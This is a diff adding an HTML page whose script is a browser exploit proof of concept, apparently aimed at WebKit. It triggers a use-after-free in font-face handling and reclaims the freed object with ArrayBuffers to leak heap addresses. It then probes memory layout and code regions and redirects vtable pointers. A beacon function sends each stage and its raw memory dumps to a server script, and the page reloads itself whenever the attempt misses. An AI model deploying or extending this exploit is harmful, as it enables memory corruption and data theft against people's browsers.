@@ -1,0 +1,380 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>P809</title>
+<style>
+body{background:#0d1117;color:#c9d1d9;font:13px monospace;margin:8px;}
+pre{color:#7ee787;background:#161b22;border:1px solid #30363d;padding:8px;border-radius:4px;white-space:pre-wrap;word-break:break-all;}
+</style>
+</head><body>
+<pre id="o">P809 single-UAF focused extraction</pre>
+<script>
+'use strict';
+var B='';
+function bn(t,d){try{var x=new XMLHttpRequest();x.open('GET',B+'/beacon.php?tag=P809-'+encodeURIComponent(t)+'&data='+encodeURIComponent(String(d||'').slice(0,700))+'&t='+Date.now(),false);x.send();}catch(e){}}
+var O=document.getElementById('o');
+function log(s){O.textContent+='\n'+s;}
+function h16(v){return('0000000000000000'+BigInt(v||0).toString(16)).slice(-16);}
+function readU64(bv,off){var lo=bv.getUint32(off,true),hi=bv.getUint32(off+4,true);return{hi:hi,lo:lo};}
+function writeU64(bv,off,hi,lo){bv.setUint32(off,lo,true);bv.setUint32(off+4,hi,true);}
+function addrStr(a){return'0x'+a.hi.toString(16)+('00000000'+a.lo.toString(16)).slice(-8);}
+function hexQ(bv,off){var lo=bv.getUint32(off,true),hi=bv.getUint32(off+4,true);return'0x'+(hi?(hi.toString(16)+('00000000'+lo.toString(16)).slice(-8)):lo.toString(16));}
+function dumpAB(ab){var v=new BigUint64Array(ab),p=[];for(var q=0;q<24;q++)if(v[q]!==BigInt(0))p.push('q'+q+'=0x'+h16(v[q]));return p.join('|');}
+
+bn('BOOT','v1');
+
+// ============ Phase A: Single UAF (auto-reload on miss) ============
+var st=document.createElement('style');
+st.textContent="@font-face{font-family:bb1;src:local(Arial);unicode-range:U+0042;}";
+document.head.appendChild(st);
+var face=new FontFace('f1',"local('Helvetica')",{unicodeRange:'U+0041'});
+document.fonts.add(face);
+void face.loaded;
+
+var abs=[],fired=false;
+Object.defineProperty(FontFace.prototype,'then',{
+  configurable:true,
+  get:function(){
+    if(fired)return undefined;
+    fired=true;
+    if(st){st.remove();st.textContent='';st=null;}
+    try{document.fonts.delete(this);}catch(e){}
+    document.body.offsetHeight;
+    abs=[];
+    for(var i=0;i<64;i++)abs.push(new ArrayBuffer(192));
+    try{document.fonts.check('1em bb1');}catch(e){}
+    document.body.offsetHeight;
+    return undefined;
+  },set:function(){}
+});
+document.fonts.load('1em f1, bb1','AB');
+
+setTimeout(function(){
+  delete FontFace.prototype.then;
+  var bestI=-1,bestNz=0;
+  for(var i=0;i<abs.length;i++){
+    var u=new Uint8Array(abs[i]),nz=0;
+    for(var j=0;j<u.length;j++)if(u[j]!==0)nz++;
+    if(nz>bestNz){bestNz=nz;bestI=i;}
+  }
+  if(bestI<0||bestNz<4){
+    bn('A-MISS','nz='+bestNz);
+    setTimeout(function(){location.reload();},300);
+    return;
+  }
+  var ab=abs[bestI];
+  var dv=new DataView(ab);
+  var q11=readU64(dv,0x58);
+  if(q11.hi===0){bn('A-MISS','q11h=0');setTimeout(function(){location.reload();},300);return;}
+  var borrow=(q11.lo<0x68)?1:0;
+  var self_addr={hi:q11.hi-borrow,lo:(q11.lo-0x68)>>>0};
+  var q13=readU64(dv,0x68);
+
+  bn('A-HIT','self='+addrStr(self_addr)+'|q13='+addrStr(q13));
+  log('HIT! self='+addrStr(self_addr)+' q13='+addrStr(q13));
+
+  // Immediate full dump
+  bn('A-DUMP',dumpAB(ab));
+
+  // ============ Phase B: Untested getters (face.src!) ============
+  setTimeout(function(){
+    bn('B0','getters');
+    var results={};
+    try{results.src=face.src;}catch(e){results.src='ERR:'+e.message;}
+    try{results.status=face.status;}catch(e){results.status='ERR:'+e.message;}
+    try{results.family=face.family;}catch(e){results.family='ERR:'+e.message;}
+    try{results.display=face.display;}catch(e){results.display='ERR:'+e.message;}
+    try{results.weight=face.weight;}catch(e){results.weight='ERR:'+e.message;}
+    try{results.unicodeRange=face.unicodeRange;}catch(e){results.unicodeRange='ERR:'+e.message;}
+    try{results.featureSettings=face.featureSettings;}catch(e){results.featureSettings='ERR:'+e.message;}
+    try{results.variationSettings=face.variationSettings;}catch(e){results.variationSettings='ERR:'+e.message;}
+    try{results.ascentOverride=face.ascentOverride;}catch(e){results.ascentOverride='ERR:'+e.message;}
+    try{results.descentOverride=face.descentOverride;}catch(e){results.descentOverride='ERR:'+e.message;}
+    try{results.lineGapOverride=face.lineGapOverride;}catch(e){results.lineGapOverride='ERR:'+e.message;}
+    try{results.sizeAdjust=face.sizeAdjust;}catch(e){results.sizeAdjust='ERR:'+e.message;}
+    var s='';for(var k in results)s+=k+'='+results[k]+'|';
+    bn('B1',s);
+    log('Props: '+s);
+
+    // B2: Check if .src reads from the C++ source list
+    // Save original q11/q13 (vector fields), then zero them
+    var orig_q11=readU64(dv,0x58);
+    var orig_q12lo=dv.getUint32(0x60,true);
+    var orig_q12hi=dv.getUint32(0x64,true);
+    var orig_q13=readU64(dv,0x68);
+
+    // Zero the vector to see if .src changes
+    writeU64(dv,0x58,0,0);
+    dv.setUint32(0x60,0,true);dv.setUint32(0x64,0,true);
+    writeU64(dv,0x68,0,0);
+
+    var src2='N/A';
+    try{src2=face.src;}catch(e){src2='ERR2:'+e.message;}
+    bn('B2','src_after_zero_vec='+String(src2).slice(0,300));
+
+    // Restore
+    writeU64(dv,0x58,orig_q11.hi,orig_q11.lo);
+    dv.setUint32(0x60,orig_q12lo,true);dv.setUint32(0x64,orig_q12hi,true);
+    writeU64(dv,0x68,orig_q13.hi,orig_q13.lo);
+
+    // ============ Phase C: Temporal monitoring — dump every 50ms ============
+    bn('C0','temporal');
+    var snapshots=[];
+    var snapCount=0;
+    function takeSnap(){
+      if(snapCount>=10){
+        // Report changes
+        var changes=[];
+        for(var s=1;s<snapshots.length;s++){
+          for(var q=0;q<24;q++){
+            if(snapshots[s][q]!==snapshots[0][q]){
+              changes.push('t'+s+'_q'+q+'=0x'+h16(snapshots[s][q])+'(was_0x'+h16(snapshots[0][q])+')');
+            }
+          }
+        }
+        bn('C1',changes.length>0?changes.join('|'):'no_changes_over_500ms');
+        log('Temporal: '+(changes.length>0?changes.join(' '):'stable'));
+
+        phaseD();
+        return;
+      }
+      var v=new BigUint64Array(ab);
+      var snap=[];
+      for(var q=0;q<24;q++)snap.push(v[q]);
+      snapshots.push(snap);
+      snapCount++;
+      setTimeout(takeSnap,50);
+    }
+    takeSnap();
+
+    // ============ Phase D: Probe Source object layout via oracle ============
+    function phaseD(){
+      bn('D0','source_layout');
+      log('Phase D: probing Source object at q13...');
+
+      // Test q13+0 through q13+0x100 in 8-byte steps
+      var origQ1=readU64(dv,0x08);
+      var tests=[];
+      for(var off=0;off<=0x100;off+=8){
+        var lo=(q13.lo+off)>>>0;
+        var hi=q13.hi;
+        if(lo<q13.lo)hi++; // overflow
+        tests.push({off:off,hi:hi,lo:lo});
+      }
+      var alive=[],idx=0;
+
+      function nextOff(){
+        if(idx>=tests.length){
+          writeU64(dv,0x08,origQ1.hi,origQ1.lo);
+          bn('D1','alive_offsets='+alive.join(','));
+          log('Source alive: '+alive.map(function(o){return'+0x'+o.toString(16);}).join(' '));
+
+          phaseE();
+          return;
+        }
+        var t=tests[idx];
+        writeU64(dv,0x08,t.hi,t.lo);
+        var sp=document.createElement('span');
+        sp.style.fontFamily='f1, serif';
+        sp.textContent='.';
+        document.body.appendChild(sp);
+        document.body.offsetHeight;
+
+        setTimeout(function(){
+          alive.push(t.off);
+          idx++;
+          nextOff();
+        },60);
+      }
+      nextOff();
+    }
+
+    // ============ Phase E: Probe code regions (0x200-0x900 range) ============
+    function phaseE(){
+      bn('E0','code_regions');
+      log('Phase E: probing for code regions...');
+      var origQ1=readU64(dv,0x08);
+
+      // Try various hi-byte ranges where WebKit code might live
+      var ranges=[];
+      // 0x1-0xF (low ranges)
+      for(var h=1;h<=15;h++)ranges.push({hi:h,lo:0x10000,label:'0x'+h.toString(16)+'_00010000'});
+      // 0x10 (our heap — known alive)
+      // 0x20-0xF0
+      for(var h=0x20;h<=0xF0;h+=0x10)ranges.push({hi:h,lo:0x10000,label:'0x'+h.toString(16)+'_00010000'});
+      // 0x100-0xF00
+      for(var h=0x100;h<=0xF00;h+=0x100)ranges.push({hi:h,lo:0x10000,label:'0x'+h.toString(16)+'_00010000'});
+
+      var alive=[],idx=0;
+
+      function nextRange(){
+        if(idx>=ranges.length){
+          writeU64(dv,0x08,origQ1.hi,origQ1.lo);
+          bn('E1','alive='+alive.join(','));
+          log('Code regions alive: '+alive.join(' '));
+
+          phaseF();
+          return;
+        }
+        var t=ranges[idx];
+        writeU64(dv,0x08,t.hi,t.lo);
+        var sp=document.createElement('span');
+        sp.style.fontFamily='f1, serif';
+        sp.textContent='.';
+        document.body.appendChild(sp);
+        document.body.offsetHeight;
+
+        setTimeout(function(){
+          alive.push(t.label);
+          idx++;
+          nextRange();
+        },60);
+      }
+      nextRange();
+    }
+
+    // ============ Phase F: Vtable redirect — try self-pointing for byte leak ============
+    function phaseF(){
+      bn('F0','vtable_redir');
+      log('Phase F: vtable redirect experiments...');
+      var origDump=dumpAB(ab);
+
+      // F1: Set q0 = q13 (source ptr as "vtable"), q1 = self
+      // This makes the engine call through Source's vtable with our AB as "this"
+      writeU64(dv,0x00,q13.hi,q13.lo); // q0 = q13
+      writeU64(dv,0x08,self_addr.hi,self_addr.lo); // q1 = self
+
+      // Force a layout access
+      var el=document.createElement('div');
+      el.style.fontFamily='f1, serif';
+      el.style.fontSize='24px';
+      el.textContent='VTABLE TEST';
+      document.body.appendChild(el);
+      document.body.offsetHeight;
+
+      setTimeout(function(){
+        bn('F1-ALIVE','survived_vtable_redirect');
+        var postDump=dumpAB(ab);
+        bn('F1-POST',postDump);
+
+        // Check what the engine wrote back
+        var changes=[];
+        var origView=new BigUint64Array(new ArrayBuffer(192));
+        // We can't compare to pre-redirect easily, just report current state
+        log('Post-redirect dump: '+postDump);
+
+        // F2: Try different q0 values to see which survive
+        // q0 = q13 survived. What about q0 = self_addr?
+        writeU64(dv,0x00,self_addr.hi,self_addr.lo); // q0 = self (recursive vtable)
+        writeU64(dv,0x08,q13.hi,q13.lo); // q1 = q13
+
+        el=document.createElement('div');
+        el.style.fontFamily='f1, serif';
+        el.textContent='SELF-VT';
+        document.body.appendChild(el);
+        document.body.offsetHeight;
+
+        setTimeout(function(){
+          bn('F2-ALIVE','self_vtable_survived');
+          bn('F2-POST',dumpAB(ab));
+
+          // F3: Try q0 = q11 (m_buffer = inline buffer within CSSFontFace)
+          var q11=readU64(dv,0x58);
+          writeU64(dv,0x00,q11.hi,q11.lo);
+          writeU64(dv,0x08,self_addr.hi,self_addr.lo);
+
+          el=document.createElement('div');
+          el.style.fontFamily='f1, serif';
+          el.textContent='Q11-VT';
+          document.body.appendChild(el);
+          document.body.offsetHeight;
+
+          setTimeout(function(){
+            bn('F3-ALIVE','q11_vtable_survived');
+            bn('F3-POST',dumpAB(ab));
+
+            // Restore original values
+            // (can't fully restore since we don't know originals after F1 changes)
+
+            phaseG();
+          },200);
+        },200);
+      },200);
+    }
+
+    // ============ Phase G: document.fonts iteration ============
+    function phaseG(){
+      bn('G0','fonts_iter');
+      log('Phase G: fonts iteration + forEach...');
+
+      // Re-add face
+      try{document.fonts.add(face);bn('G1','readded');}catch(e){bn('G1','err='+e.message);}
+
+      // Iterate all fonts
+      var fontList=[];
+      try{
+        document.fonts.forEach(function(f,idx){
+          var info='';
+          try{info+='fam='+f.family;}catch(e){info+='fam=ERR';}
+          try{info+='|src='+String(f.src).slice(0,80);}catch(e){info+='|src=ERR';}
+          try{info+='|st='+f.status;}catch(e){info+='|st=ERR';}
+          fontList.push(info);
+        });
+        bn('G2','count='+fontList.length+'|'+fontList.join('||'));
+      }catch(e){bn('G2','forEach_err='+e.message);}
+
+      // G3: Check what values face.loaded resolves to
+      try{
+        face.loaded.then(function(r){
+          bn('G3-RESOLVE','type='+typeof r+'|str='+String(r).slice(0,100));
+          try{
+            var keys=Object.keys(r);
+            bn('G3-KEYS','keys='+keys.join(','));
+          }catch(e){}
+        }).catch(function(e){
+          bn('G3-REJECT',e.message);
+        });
+      }catch(e){bn('G3-ERR',e.message);}
+
+      // G4: Try creating FontFaceSet and loading
+      try{
+        var result=document.fonts.check('1em f1');
+        bn('G4','check='+result);
+      }catch(e){bn('G4','err='+e.message);}
+
+      // G5: Final dump
+      setTimeout(function(){
+        bn('G5-FINAL',dumpAB(ab));
+
+        // ============ Phase H: Dword-level comparison of original vs current ============
+        bn('H0','dword_scan');
+        var dwords=[];
+        for(var d=0;d<48;d++){
+          var val=dv.getUint32(d*4,true);
+          if(val!==0){
+            var fbuf=new ArrayBuffer(4);
+            new Uint32Array(fbuf)[0]=val;
+            var fval=new Float32Array(fbuf)[0];
+            var extra='';
+            if(isFinite(fval)&&fval!==0&&Math.abs(fval)>0.001&&Math.abs(fval)<1e10){
+              extra='(f'+fval.toFixed(3)+')';
+            }
+            if(val>=0x10000000&&val<=0x1FFFFFFF)extra+='(heap_lo?)';
+            if(val>=0xFFFF0000)extra+='(sentinel?)';
+            dwords.push('d'+d+'=0x'+val.toString(16)+extra);
+          }
+        }
+        var chunk='';
+        for(var i=0;i<dwords.length;i++){
+          if(chunk.length+dwords[i].length>650){bn('H1',chunk);chunk='';}
+          if(chunk.length>0)chunk+='|';
+          chunk+=dwords[i];
+        }
+        if(chunk)bn('H1',chunk);
+
+        bn('DONE','all_complete');
+        log('\nDONE');
+      },300);
+    }
+
+  },100); // end Phase B
+},400); // end Phase A timeout
+</script></body></html>
